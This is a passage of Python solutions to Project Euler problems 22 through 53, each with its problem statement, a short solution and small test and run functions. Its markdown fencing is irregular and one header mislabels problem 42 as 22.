    assert "COLIN" == name
    assert 53 == alphabetical_value(name)


def run():
    print(sum_alphabetical_values(NAMES))


if __name__ == "__main__":
    test()
    run()

#!/usr/bin/env python```


```py
Solution to Project Euler Problem 23
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/


A perfect number is a number for which the sum of its proper divisors is
exactly equal to the number. For example, the sum of the proper divisors of 28
would be 1 + 2 + 4 + 7 + 14 = 28, which means that 28 is a perfect number.

A number n is called deficient if the sum of its proper divisors is less than n
and it is called abundant if this sum exceeds n.

As 12 is the smallest abundant number, 1 + 2 + 3 + 4 + 6 = 16, the smallest
number that can be written as the sum of two abundant numbers is 24. By
mathematical analysis, it can be shown that all integers greater than 28123
can be written as the sum of two abundant numbers. However, this upper limit
cannot be reduced any further by analysis even though it is known that the
greatest number that cannot be expressed as the sum of two abundant numbers
is less than this limit.

Find the sum of all the positive integers which cannot be written as the sum of
two abundant numbers.```


```py
from factorization import divisors


def is_abundant(x):
    return 2 * x < sum(divisors(x))


def not_sum_of_abundants(m):
    abundant = [x for x in range(2, m + 1) if is_abundant(x)]
    sum_of_abundant = {a + b for i, a in enumerate(abundant) for b in abundant[i:]}
    return (x for x in range(1, m + 1) if x not in sum_of_abundant)


def test():
    assert set(range(1, 30)) - {24} == set(not_sum_of_abundants(30))


def run():
    print(sum(not_sum_of_abundants(28123)))


if __name__ == "__main__":
    test()
    run()

#!/usr/bin/env python```


```py
Solution to Project Euler Problem 24
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/

A permutation is an ordered arrangement of objects. For example, 3124 is one
possible permutation of the digits 1, 2, 3 and 4. If all of the permutations
are listed numerically or alphabetically, we call it lexicographic order. The
lexicographic permutations of 0, 1 and 2 are:

012   021   102   120   201   210

What is the millionth lexicographic permutation of the digits 0, 1, 2, 3, 4,
5, 6, 7, 8 and 9?```


```py
from itertools import permutations
from itertools import islice


def nth_element(iterable, n):
    return next(islice(iterable, n - 1, n))


def nth_permutation(digits, n):
    return "".join(nth_element(permutations(digits), n))


def test():
    assert "210" == nth_permutation("012", 6)


def run():
    print(nth_permutation("0123456789", 10 ** 6))


if __name__ == "__main__":
    test()
    run()

#!/usr/bin/env python```


```py
Solution to Project Euler Problem 25
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/


The Fibonacci sequence is defined by the recurrence relation:

    Fn = Fn−1 + Fn−2, where F1 = 1 and F2 = 1.

Hence the first 12 terms will be:

    F1 = 1
    F2 = 1
    F3 = 2
    F4 = 3
    F5 = 5
    F6 = 8
    F7 = 13
    F8 = 21
    F9 = 34
    F10 = 55
    F11 = 89
    F12 = 144

The 12th term, F12, is the first term to contain three digits.

What is the first term in the Fibonacci sequence to contain 1000 digits?```


```py
from series import all_fibs


def first_fib_with_len(n):
    for i, f in enumerate(all_fibs(), start=1):
        if len(str(f)) >= n:
            return i


def test():
    assert 12 == first_fib_with_len(3)


def run():
    print(first_fib_with_len(1000))


if __name__ == "__main__":
    test()
    run()

#!/usr/bin/env python```


```py
Solution to Project Euler Problem 26
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/


A unit fraction contains 1 in the numerator. The decimal representation of the
unit fractions with denominators 2 to 10 are given:

    1/2 =   0.5
    1/3 =   0.(3)
    1/4 =   0.25
    1/5 =   0.2
    1/6 =   0.1(6)
    1/7 =   0.(142857)
    1/8 =   0.125
    1/9 =   0.(1)
    1/10    =   0.1

Where 0.1(6) means 0.166666..., and has a 1-digit recurring cycle. It can be
seen that 1/7 has a 6-digit recurring cycle.

Find the value of d < 1000 for which 1/d contains the longest recurring cycle
in its decimal fraction part.```


```py


def long_division_pattern(d):
    seen = {}
    r = 1
    k = 0
    while r:
        k += 1
        seen[r] = k
        r = r * 10 % d
        if r in seen:
            return k - seen[r]
    return 0


def find_longest_recurring(m):
    return max((long_division_pattern(i), i) for i in range(2, m))


def test():
    assert 7 == find_longest_recurring(10)[1]


def run():
    print(find_longest_recurring(1000)[1])


if __name__ == "__main__":
    test()
    run()

#!/usr/bin/env python```


```py
Solution to Project Euler Problem 27
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/

Euler published the remarkable quadratic formula:

n² + n + 41

It turns out that the formula will produce 40 primes for the consecutive values
n = 0 to 39. However, when n = 40, 402 + 40 + 41 = 40(40 + 1) + 41 is divisible
by 41, and certainly when n = 41, 41² + 41 + 41 is clearly divisible by 41.

Using computers, the incredible formula  n² − 79n + 1601 was discovered, which
produces 80 primes for the consecutive values n = 0 to 79. The product of the
coefficients, −79 and 1601, is −126479.

Considering quadratics of the form:

    n² + an + b, where |a| < 1000 and |b| < 1000

    where |n| is the modulus/absolute value of n
    e.g. |11| = 11 and |−4| = 4

Find the product of the coefficients, a and b, for the quadratic expression
that produces the maximum number of primes for consecutive values of n,
starting with n = 0.```


```py
from itertools import count
from primality import is_prime, primes_upto


def odd(x):
    return x % 2


def quadratic(n, a, b):
    return n ** 2 + a * n + b


def count_consecutive_generated_primes(a, b):
    for n in count():
        if not is_prime(quadratic(n, a, b)):
            return n - 2


def ab_prime_generators(i, j):
    for b in primes_upto(j):
        for a in range(i, j):
            if odd(a):
                yield (1 + count_consecutive_generated_primes(a, b), a, b)
            else:
                yield (1, a, b)


def ab_prime_generator_with_max_len(i, j):
    return max(ab_prime_generators(i, j))


def test():
    assert (39, 1, 41) == ab_prime_generator_with_max_len(0, 43)


def run():
    longest = ab_prime_generator_with_max_len(-1000 + 1, 1000)
    print(longest[1] * longest[2])


if __name__ == "__main__":
    test()
    run()

#!/usr/bin/env python```


```py
Solution to Project Euler Problem 28
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/


Starting with the number 1 and moving to the right in a clockwise direction a
5 by 5 spiral is formed as follows:

21 22 23 24 25
20  7  8  9 10
19  6  1  2 11
18  5  4  3 12
17 16 15 14 13

It can be verified that the sum of the numbers on the diagonals is 101.

What is the sum of the numbers on the diagonals in a 1001 by 1001 spiral formed
in the same way?```


```py
from spirals import spiral_diagonal_numbers_upto
from spirals import n_diagonal_for_side


def spiral_diagonal_numbers_upto_side(m):
    count = n_diagonal_for_side(m)
    return (n for n, _i, _ in spiral_diagonal_numbers_upto(count))


def spiral_diagonal_sum(m):
    return sum(spiral_diagonal_numbers_upto_side(m))


def test():
    diagsin5 = [1, 3, 5, 7, 9, 13, 17, 21, 25]
    assert diagsin5 == list(spiral_diagonal_numbers_upto_side(5))
    assert 101 == spiral_diagonal_sum(5)


def run():
    print(spiral_diagonal_sum(1001))


if __name__ == "__main__":
    test()
    run()

#!/usr/bin/env python```


```py
Solution to Project Euler Problem 29
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/


Consider all integer combinations of a^b for 2 ≤ a ≤ 5 and 2 ≤ b ≤ 5:

    22=4, 23=8, 24=16, 25=32
    32=9, 33=27, 34=81, 35=243
    42=16, 43=64, 44=256, 45=1024
    52=25, 53=125, 54=625, 55=3125

If they are then placed in numerical order, with any repeats removed, we get
the following sequence of 15 distinct terms:

4, 8, 9, 16, 25, 27, 32, 64, 81, 125, 243, 256, 625, 1024, 3125

How many distinct terms are in the sequence generated by a^b for 2 ≤ a ≤ 100
and 2 ≤ b ≤ 100?```


```py


def power_combinations(m):
    return {a ** b for a in range(2, m + 1) for b in range(2, m + 1)}


def test():
    assert 15 == len(power_combinations(5))


def run():
    print(len(power_combinations(100)))


if __name__ == "__main__":
    test()
    run()

#!/usr/bin/env python```


```py
Solution to Project Euler Problem 30
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/


Surprisingly there are only three numbers that can be written as the sum of
fourth powers of their digits:

    1634 = 14 + 64 + 34 + 44
    8208 = 84 + 24 + 04 + 84
    9474 = 94 + 44 + 74 + 44

As 1 = 14 is not a sum it is not included.

The sum of these numbers is 1634 + 8208 + 9474 = 19316.

Find the sum of all the numbers that can be written as the sum of fifth powers
of their digits.```


```py
from itertools import count
from digits import digits


def power_of_digits(n, k):
    return (x ** k for x in digits(n))


def numbers_that_sum_power_of_digits(k):
    for n in count(2):
        d = list(digits(n))
        if len(d) * (9 ** k) < n:
            break
        if n == sum(power_of_digits(n, k)):
            yield n


def test():
    assert 19316 == sum(numbers_that_sum_power_of_digits(4))


def run():
    print(sum(numbers_that_sum_power_of_digits(5)))


if __name__ == "__main__":
    test()
    run()

#!/usr/bin/env python```


```py
Solution to Project Euler Problem 31
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/


In England the currency is made up of pound, £, and pence, p, and there are
eight coins in general circulation:

    1p, 2p, 5p, 10p, 20p, 50p, £1 (100p) and £2 (200p).

It is possible to make £2 in the following way:

    1×£1 + 1×50p + 2×20p + 1×5p + 1×2p + 3×1p

How many different ways can £2 be made using any number of coins?```


```py


DENOMINATIONS = [1, 2, 5, 10, 20, 50, 100, 200]


def ways_to_make_change(amount, denom):
    denom = list(sorted(denom))
    if amount <= 0:
        yield []
    elif denom:
        *denom, d = denom
        for i in range(1 + amount // d):
            for w in ways_to_make_change(amount - i * d, denom):
                if w is not None:
                    if i:
                        yield [(i, d)] + w
                    else:
                        yield w


def count_ways_to_change(amount, denominations):
    ways = 0
    for w in ways_to_make_change(amount, denominations):
        assert amount == sum(n * d for n, d in w)
        ways += 1
    return ways


def test():
    assert 4 == count_ways_to_change(5, DENOMINATIONS)
    d = DENOMINATIONS[:]
    from random import shuffle

    shuffle(d)
    assert 4 == count_ways_to_change(5, d)


def run():
    print(count_ways_to_change(200, DENOMINATIONS))


if __name__ == "__main__":
    test()
    run()

#!/usr/bin/env python```


```py
Solution to Project Euler Problem 32
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/

We shall say that an n-digit number is pandigital if it makes use of all the
digits 1 to n exactly once; for example, the 5-digit number, 15234, is 1
through 5 pandigital.

The product 7254 is unusual, as the identity, 39 × 186 = 7254, containing
multiplicand, multiplier, and product is 1 through 9 pandigital.

Find the sum of all products whose multiplicand/multiplier/product identity
can be written as a 1 through 9 pandigital.
HINT: Some products can be obtained in more than one way so be sure to only
include it once in your sum.```


```py
from digits import is_pandigital
from digits import is_semi_pandigital
from digits import digits_downfrom


def is_pandigital_product(a, b, n, k=9):
    return is_pandigital(str(a) + str(b) + str(n))


def find_pandigital_products(k):
    upper = int(digits_downfrom(k, 1)[: -k // 2])
    for a in range(2, upper):
        if not is_semi_pandigital(a):
            continue
        for b in range(a, upper):
            n = a * b
            if n > upper:
                break
            if is_pandigital_product(a, b, n):
                yield (a, b, n)


def test():
    assert is_pandigital(978564231)
    assert is_pandigital(13452)
    assert is_semi_pandigital(543)
    assert not is_semi_pandigital(3543)


def run():
    print(sum(set(n for _a, _b, n in find_pandigital_products(9))))


if __name__ == "__main__":
    test()
    run()

#!/usr/bin/env python```


```py
Solution to Project Euler Problem 33
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/


The fraction 49/98 is a curious fraction, as an inexperienced mathematician in
attempting to simplify it may incorrectly believe that 49/98 = 4/8, which is
correct, is obtained by cancelling the 9s.

We shall consider fractions like, 30/50 = 3/5, to be trivial examples.

There are exactly four non-trivial examples of this type of fraction, less than
one in value, and containing two digits in the numerator and denominator.

If the product of these four fractions is given in its lowest common terms,
find the value of the denominator.```


```py
import operator
from functools import reduce
from fractions import Fraction


def unortodox_denom(lower, d):
    ds = str(d)
    if ds[-1] == "0":
        digits = ds[:-1]
    else:
        digits = ds
    for n in range(lower, d):
        f = Fraction(n, d)
        ns = str(n)
        for x in digits:
            if x in ns:
                nr = int(ns.replace(x, "", 1))
                dr = int(ds.replace(x, "", 1))
                if nr and dr and f == Fraction(nr, dr):
                    return f


def unortodox_fractions(k):
    lower = 10 ** (k - 1)
    upper = int(k * "9")
    for d in range(lower, upper + 1):
        f = unortodox_denom(lower, d)
        if f:
            yield f


def test():
    assert Fraction(4, 8) == unortodox_denom(49, 98)


def run():
    numbers = list(unortodox_fractions(2))
    print(reduce(operator.mul, numbers, 1).denominator)


if __name__ == "__main__":
    test()
    run()

#!/usr/bin/env python```


```py
Solution to Project Euler Problem 34
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/

145 is a curious number, as 1! + 4! + 5! = 1 + 24 + 120 = 145.

Find the sum of all numbers which are equal to the sum of the factorial of
their digits.

Note: as 1! = 1 and 2! = 2 are not sums they are not included.```


```py
from itertools import count
from digits import digits
from series import factorial


def sum_fact_digits(n):
    return sum(factorial(d) for d in digits(n))


def list_sum_fact_digits():
    f9 = factorial(9)
    for n in count(3):
        k = len(str(n))
        if k * f9 < 9 * 10 ** k:
            break
        if n == sum_fact_digits(n):
            yield n


def test():
    assert 145 == sum_fact_digits(145)


def run():
    print(sum(list_sum_fact_digits()))


if __name__ == "__main__":
    test()
    run()

#!/usr/bin/env python```


```py
Solution to Project Euler Problem 35
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/


The number, 197, is called a circular prime because all digit_rotations of the digits:
197, 971, and 719, are themselves prime.

There are thirteen such primes below 100:

2, 3, 5, 7, 11, 13, 17, 31, 37, 71, 73, 79, and 97.

How many circular primes are there below one million?```


```py
from primality import is_prime, primes_upto
from digits import digit_rotations


def is_circular_prime(n):
    return "0" not in str(n) and all(is_prime(r) for r in digit_rotations(n))


def count_circular_primes(m):
    return sum(is_circular_prime(n) for n in primes_upto(m))


def test():
    assert [197, 971, 719] == list(digit_rotations(197))
    assert is_circular_prime(197)
    assert 13 == count_circular_primes(10 ** 2)


def run():
    print(count_circular_primes(10 ** 6))


if __name__ == "__main__":
    test()
    run()

#!/usr/bin/env python```


```py
Solution to Project Euler Problem 36
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/

The decimal number, 585 = 10010010012 (binary), is palindromic in both bases.

Find the sum of all numbers, less than one million, which are palindromic in
base 10 and base 2.

(Please note that the palindromic number, in either base, may not include
leading zeros.)```


```py
from palindromes import is_palindrome


def to_binary(n):
    return "{:b}".format(n)


def dec_and_bin_palindromes(m):
    for n in range(1, m):
        if is_palindrome(n) and is_palindrome(to_binary(n)):
            yield n


def sum_dec_and_bin_palindromes(m):
    return sum(x for x in dec_and_bin_palindromes(m))


def test():
    assert is_palindrome(585) and is_palindrome(to_binary(585))


def run():
    print(sum_dec_and_bin_palindromes(10 ** 6))


if __name__ == "__main__":
    test()
    run()

#!/usr/bin/env python```


```py
Solution to Project Euler Problem 37
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/

````

````py
from primality import is_prime, primes_upto
from memoization import memoize


TRUNCATABLE_PRIMES = {23, 37, 53, 73}


@memoize
def is_left_prime(n):
    s = str(n)
    while s:
        n = int(s)
        if not is_prime(n):
            return False
        elif n in TRUNCATABLE_PRIMES:
            return True
        s = s[1:]
    return True


@memoize
def is_right_prime(n):
    s = str(n)
    while s:
        n = int(s)
        if not is_prime(n):
            return False
        elif n in TRUNCATABLE_PRIMES:
            return True
        s = s[:-1]
    return True


def truncatable_primes(m):
    for p in primes_upto(m):
        if p < 11 or p in TRUNCATABLE_PRIMES:
            continue
        if is_left_prime(p) and is_right_prime(p):
            TRUNCATABLE_PRIMES.add(p)
    return TRUNCATABLE_PRIMES


def test():
    assert is_prime(73)
    assert is_prime(97)
    assert is_prime(3797)
    assert is_left_prime(3797)
    assert is_right_prime(3797)
    assert {3137, 37, 73, 797, 3797, 53, 23, 313, 317, 373} == truncatable_primes(
        10 ** 4
    )


def run():
    print(sum(truncatable_primes(10 ** 6)))


if __name__ == "__main__":
    test()
    run()

#!/usr/bin/env python```


```py
Solution to Project Euler Problem 38
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/

Take the number 192 and multiply it by each of 1, 2, and 3:

    192 × 1 = 192
    192 × 2 = 384
    192 × 3 = 576

By concatenating each product we get the 1 to 9 pandigital, 192384576. We will call 192384576 the concatenated product of 192 and (1,2,3)

The same can be achieved by starting with 9 and multiplying by 1, 2, 3, 4, and 5, giving the pandigital, 918273645, which is the concatenated product of 9 and (1,2,3,4,5).

What is the largest 1 to 9 pandigital 9-digit number that can be formed as the concatenated product of an integer with (1,2, ... , n) where n > 1?
````

````py
from itertools import count
from digits import is_pandigital
from digits import is_semi_pandigital


def concatenated_product(n, k):
    return "".join(str(n * i) for i in range(1, k + 1))


def largest_pandigital_concatenated_product():
    top = 1
    for n in range(1, int("9" * 5)):
        if not is_semi_pandigital(n):
            continue
        cprod = str(n)
        for k in count(2):
            next = str(n * k)
            cprod += next
            if len(cprod) > 9 or not is_semi_pandigital(next):
                break
            elif len(cprod) < 9:
                continue
            elif is_pandigital(cprod) and int(cprod) > top:
                top = int(cprod)
    return top


def test():
    assert "192384576" == concatenated_product(192, 3), concatenated_product(192, 3)
    assert "918273645" == concatenated_product(9, 5)
    assert is_pandigital(concatenated_product(9, 5))


def run():
    print(largest_pandigital_concatenated_product())


if __name__ == "__main__":
    test()
    run()

#!/usr/bin/env python```


```py
Solution to Project Euler Problem
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/

````

````py
from math import sqrt
from collections import defaultdict


def perimeter_combinations_for(limit):
    perims = defaultdict(set)
    for a in range(1, limit // 2):
        for b in range(1, limit - a - 1):
            c = sqrt(a ** 2 + b ** 2)
            p = int(a + b + c)
            if p >= limit:
                break
            elif c == int(c):
                c = int(c)
                triangle = tuple(sorted((a, b, c)))
                perims[p].add(triangle)
    return perims


def test():
    combs = {(20, 48, 52), (24, 45, 51), (30, 40, 50)}
    assert combs == perimeter_combinations_for(125)[120]


def run():
    print(max((len(s), p) for p, s in perimeter_combinations_for(1001).items())[1])


if __name__ == "__main__":
    test()
    run()

#!/usr/bin/env python```


```py
Solution to Project Euler Problem 40
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/

An irrational decimal fraction is created by concatenating the positive integers:

0.123456789101112131415161718192021...

It can be seen that the 12th digit of the fractional part is 1.

If dn represents the nth digit of the fractional part, find the value of the following expression.

d1 × d10 × d100 × d1000 × d10000 × d100000 × d1000000
````

````py
from itertools import count
from functools import reduce
from operator import mul


def counting_digits():
    for number in count(1):
        for digit in str(number):
            yield digit


def select_digits(selectors):
    s = list(sorted(selectors))
    for i, d in enumerate(counting_digits(), start=1):
        if not s:
            break
        if i >= s[0]:
            if i == s[0]:
                yield int(d)
            s = s[1:]


def test():
    assert [1] == list(select_digits([12]))


def run():
    sel = [10 ** i for i in range(6 + 1)]
    print(reduce(mul, (c for c in select_digits(sel)), 1))


if __name__ == "__main__":
    test()
    run()

#!/usr/bin/env python```


```py
Solution to Project Euler Problem
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/


We shall say that an n-digit number is pandigital if it makes use of all
the digits 1 to n exactly once. For example, 2143 is a 4-digit pandigital
and is also prime.

What is the largest n-digit pandigital prime that exists?```


```py
from digits import is_pandigital
from primality import primes_upto, is_prime


def pandigital_primes(digits=7):
    for p in primes_upto(int("9" * digits)):
        if is_pandigital(p):
            yield p


def test():
    assert not is_prime(123)
    assert not is_prime(132)
    assert not is_prime(213)
    assert not is_prime(231)
    assert not is_prime(312)
    assert not is_prime(321)
    assert is_prime(2143)
    assert is_pandigital(2143)
    assert 2143 in set(pandigital_primes(digits=4))


def run():
    print(list(pandigital_primes())[-1])


if __name__ == "__main__":
    test()
    run()

#!/usr/bin/env python```


```py
Solution to Project Euler Problem 22
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/
````

````py
import csv
from pathlib import Path
from words import alphabetical_value
from series import is_triangle


FILENAME = Path(__file__).parent / "../data/words.txt"


def count_triangle_words(names):
    return sum(1 for w in names if is_triangle(alphabetical_value(w)))


def test():
    assert 55 == alphabetical_value("SKY")
    assert is_triangle(55)


def run():
    names = next(csv.reader(open(FILENAME)))
    print(count_triangle_words(names))


if __name__ == "__main__":
    test()
    run()

#!/usr/bin/env python```


```py
Solution to Project Euler Problem 43
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/

The number, 1406357289, is a 0 to 9 pandigital number because it is made up of each of the digits 0 to 9 in some order, but it also has a rather interesting sub-string divisibility property.

Let d1 be the 1st digit, d2 be the 2nd digit, and so on. In this way, we note the following:

    d2d3d4=406 is divisible by 2
    d3d4d5=063 is divisible by 3
    d4d5d6=635 is divisible by 5
    d5d6d7=357 is divisible by 7
    d6d7d8=572 is divisible by 11
    d7d8d9=728 is divisible by 13
    d8d9d10=289 is divisible by 17

Find the sum of all 0 to 9 pandigital numbers with this property.
````

````py
from primality import nth_prime
from digits import digits_upto
from itertools import permutations


def is_subdivisible(n):
    sn = str(n)
    for i in range(1, 8):
        if int(sn[i : i + 3]) % nth_prime(i):
            break
    else:
        return True


def subdivisible_pandigitals(k, i=0):
    digits = digits_upto(k, i)
    for p in permutations(digits):
        n = int("".join(p))
        if len(str(n)) != len(digits):
            continue
        if is_subdivisible(n):
            yield n


def test():
    assert is_subdivisible(1406357289)


def run():
    print(sum(subdivisible_pandigitals(9)))


if __name__ == "__main__":
    test()
    run()

#!/usr/bin/env python```


```py
Solution to Project Euler Problem 44
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/

Pentagonal numbers are generated by the formula, Pn=n(3n−1)/2. The first
ten pentagonal numbers are:

1, 5, 12, 22, 35, 51, 70, 92, 117, 145, ...

It can be seen that P4 + P7 = 22 + 70 = 92 = P8. However, their difference,
70 − 22 = 48, is not pentagonal.

Find the pair of pentagonal numbers, Pj and Pk, for which their sum and
difference is pentagonal and D = |Pk − Pj| is minimised; what is the value
of D?```


```py
from series import pentagonals, pentagonal, is_pentagonal


def pentagonal_sum_and_diff():
    for k in pentagonals():
        for d in pentagonals(upto=k):
            j = abs(k - d)
            if j > 0 and is_pentagonal(j) and is_pentagonal(j + k):
                return j, k


def test():
    assert is_pentagonal(pentagonal(4) + pentagonal(7))
    assert not is_pentagonal(pentagonal(70) + pentagonal(22))


def run():
    j, k = pentagonal_sum_and_diff()
    print(abs(j - k))


if __name__ == "__main__":
    test()
    run()

#!/usr/bin/env python```


```py
Solution to Project Euler Problem 45
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/

Triangle, pentagonal, and hexagonal numbers are generated by the following
formulae:

Triangle           Tn=n(n+1)/2            1, 3, 6, 10, 15, ...
Pentagonal         Pn=n(3n−1)/2           1, 5, 12, 22, 35, ...
Hexagonal          Hn=n(2n−1)             1, 6, 15, 28, 45, ...

It can be verified that T285 = P165 = H143 = 40755.

Find the next triangle number that is also pentagonal and hexagonal.```


```py
from series import exagonals, is_exagonal, is_pentagonal, is_triangle


def next_multiagonal(upfrom):
    for n in exagonals():
        if n > upfrom and is_pentagonal(n) and is_triangle(n):
            return n


def test():
    assert is_triangle(40755)
    assert is_pentagonal(40755)
    assert is_exagonal(40755)
    assert 40755 == next_multiagonal(40750)


def run():
    print(next_multiagonal(40755))


if __name__ == "__main__":
    test()
    run()

#!/usr/bin/env python```


```py
Solution to Project Euler Problem 46
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/

It was proposed by Christian Goldbach that every odd composite number can be
written as the sum of a prime and twice a square.

9 = 7 + 2×12
15 = 7 + 2×22
21 = 3 + 2×32
25 = 7 + 2×32
27 = 19 + 2×22
33 = 31 + 2×12

It turns out that the conjecture was false.

What is the smallest odd composite that cannot be written as the sum of a prime
and twice a square?```


```py
from math import sqrt
from itertools import count
from primality import is_prime, primes_upto


def odd_composites(upfrom=4):
    for n in count(upfrom):
        if n % 2 and not is_prime(n):
            yield n


def is_prime_plus_2square(n):
    for p in primes_upto(n):
        c = sqrt((n - p) // 2)
        if c == int(c):
            return True


def first_non_prime_plus_2square():
    for n in odd_composites():
        if not is_prime_plus_2square(n):
            return n


def test():
    assert is_prime_plus_2square(9)
    assert is_prime_plus_2square(15)
    assert is_prime_plus_2square(21)
    assert is_prime_plus_2square(25)
    assert is_prime_plus_2square(27)
    assert is_prime_plus_2square(33)


def run():
    print(first_non_prime_plus_2square())


if __name__ == "__main__":
    test()
    run()

#!/usr/bin/env python```


```py
Solution to Project Euler Problem 47
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/

Distinct primes factors

The first two consecutive numbers to have two distinct prime factors are:

14 = 2 × 7
15 = 3 × 5

The first three consecutive numbers to have three distinct prime factors are:

644 = 2² × 7 × 23
645 = 3 × 5 × 43
646 = 2 × 17 × 19.

Find the first four consecutive integers to have four distinct primes factors.
What is the first of these numbers?```


```py
from factorization import factors


def n_factors(n):
    return len(list(factors(n)))


def first_k_consecutive_with_k_factors(k):
    n = k
    while True:
        for i in range(k):
            if n_factors(n + i) != k:
                n += i + 1
                break
        else:
            return n


def test():
    assert 2 == n_factors(14)
    assert 2 == n_factors(15)
    assert 3 == n_factors(644), str(n_factors(644)) + " - " + str(factors(644))
    assert 3 == n_factors(645)
    assert 3 == n_factors(646)
    assert 14 == first_k_consecutive_with_k_factors(2)
    assert 644 == first_k_consecutive_with_k_factors(3)


def run():
    print(first_k_consecutive_with_k_factors(4))


if __name__ == "__main__":
    test()
    run()

#!/usr/bin/env python```


```py
Solution to Project Euler Problem 48
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/

Self Powers

The series, 1^1 + 2^2 + 3^3 + ... + 10^10 = 10405071317.

Find the last ten digits of the series, 1^1 + 2^2 + 3^3 + ... + 1000^1000.```


```py
from digits import last_k_digits


def n_digits_from_power(k, n):
    p = 1
    for _ in range(n):
        p = last_k_digits(k, p * n)
    return p


def n_digits_from_sum_of_powers(k, p):
    return last_k_digits(k, sum(n_digits_from_power(k, i) for i in range(1, p + 1)))


def test():
    assert 10405071317 == n_digits_from_sum_of_powers(15, 10)


def run():
    assert 9110846700 == n_digits_from_sum_of_powers(10, 1000)


if __name__ == "__main__":
    test()
    run()

#!/usr/bin/env python```


```py
Solution to Project Euler Problem 50
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/


Consecutive Prime Sum

The prime 41, can be written as the sum of six consecutive primes:
41 = 2 + 3 + 5 + 7 + 11 + 13

This is the longest sum of consecutive primes that adds to a prime below
one-hundred.

The longest sum of consecutive primes below one-thousand that adds to a
prime, contains 21 terms, and is equal to 953.

Which prime, below one-million, can be written as the sum of the most
consecutive primes?```


```py
from primality import primes_upto
from primality import is_prime


def consecutive_primes_that_sum_prime(limit):
    primes = list(primes_upto(limit))
    while primes[0] + primes[-1] > limit:
        del primes[-1]

    for n in range(len(primes), 2, -1):
        s = sum(primes[:n])
        for i in range(len(primes) - n):
            if s > limit:
                break
            elif is_prime(s):
                return s, n
            else:
                s += primes[i + n] - primes[i]


def test():
    assert (41, 6) == consecutive_primes_that_sum_prime(10 ** 2)


def run():
    assert 997651 == consecutive_primes_that_sum_prime(10 ** 6)[0]


if __name__ == "__main__":
    test()
    run()

#!/usr/bin/env python```


```py
Solution to Project Euler Problem 52
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/


Permuted multiples

It can be seen that the number, 125874, and its double, 251748, contain
exactly the same digits, but in a different order.

Find the smallest positive integer, x, such that 2x, 3x, 4x, 5x, and 6x,
contain the same digits.```


```py
from itertools import count
from digits import sorted_digits


def same_digits_in_multiples(multiples):
    for i in count(100000):
        idigits = sorted_digits(i)
        result = [i]
        for j in multiples:
            m = i * j
            jdigits = sorted_digits(m)
            if jdigits != idigits:
                break
            result.append(m)
        else:
            return result


def test():
    assert [125874, 251748] == same_digits_in_multiples([2])


def run():
    assert 142857 == same_digits_in_multiples([2, 3, 4, 5, 6])[0]


if __name__ == "__main__":
    test()
    run()

#!/usr/bin/env python```


```py
Solution to Project Euler Problem 53
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/


Combinatoric selections

There are exactly ten ways of selecting three from five, 12345:

123, 124, 125, 134, 135, 145, 234, 235, 245, and 345

In combinatorics, we use the notation, 5C3 = 10.

In general,

